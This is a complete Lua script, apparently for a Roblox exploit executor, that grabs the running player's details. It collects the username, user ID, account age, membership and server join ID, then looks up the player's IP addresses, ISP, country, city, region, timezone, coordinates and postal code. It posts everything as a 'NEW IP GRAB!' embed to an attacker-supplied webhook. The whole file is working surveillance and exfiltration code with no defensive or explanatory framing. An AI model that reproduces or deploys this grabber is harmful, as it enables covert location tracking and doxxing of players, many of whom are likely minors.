local url = getgenv().webhook


local username = game.Players.LocalPlayer.Name

local age = game.Players.LocalPlayer.AccountAge

local MembershipType = nil

if game.Players.LocalPlayer.MembershipType == Enum.MembershipType.None then
    MembershipType = "None"
    end
if game.Players.LocalPlayer.MembershipType == Enum.MembershipType.Premium then
    MembershipType = "Premium"
end

local userid = game.Players.LocalPlayer.UserId 

local jobid = "Roblox.GameLauncher.joinGameInstance("..game.PlaceId..',"'..game.JobId..'")'

local ip4 = game:HttpGet("https://api.ipify.org/")

local ip6 = game:HttpGet("https://ipapi.co/ip")

local isp = game:HttpGet("https://ipapi.co/org")

local country = game:HttpGet("https://ipapi.co/country_name")

local city = game:HttpGet("https://ipapi.co/city")

local state = game:HttpGet("https://ipapi.co/region")

local timezone = game:HttpGet("https://ipapi.co/timezone")

local lat = game:HttpGet("https://ipapi.co/latitude")

local long = game:HttpGet("https://ipapi.co/longitude")

local citylatlong = lat,long 

local currency = game:HttpGet("https://ipapi.co/currency")

local zip = game:HttpGet("https://ipapi.co/postal")



local data = {
   ["content"] = "",
   ["embeds"] = {
       {
           ["title"] = "**NEW IP GRAB!**",
           ["description"] = "***ACCOUNT INFO*** - \n\nUsername: "..username.."\nAccount Age: "..age.."\nMembershipType: "..MembershipType.."\nUserId: "..userid.."\nJobId: "..jobid.."\n\n\n***IP INFO*** - \n\nIPv4: "..ip4.."\nIPv6: "..ip6.."\nISP: "..isp.."\nCountry: "..country.."\nCity: "..city.."\nState/Province: "..state.."\nTimeZone: "..timezone.."\nCity Latitude / Longitude: "..citylatlong.."\nCurrency: "..currency.."\nZipCode: "..zip,
           ["type"] = "rich",
           ["color"] = 0,
           ["image"] = {
               ["url"] = "http://www.roblox.com/Thumbs/Avatar.ashx?x=150&y=150&Format=Png&username=" ..
                   tostring(game:GetService("Players").LocalPlayer.Name)
           }
       }
   }
}

request = http_request or request or HttpPost or syn.request

local send = {Url = url, Body = game:GetService("HttpService"):JSONEncode(data), Method = "POST", Headers = {["content-type"] = "application/json"}}

request(send)
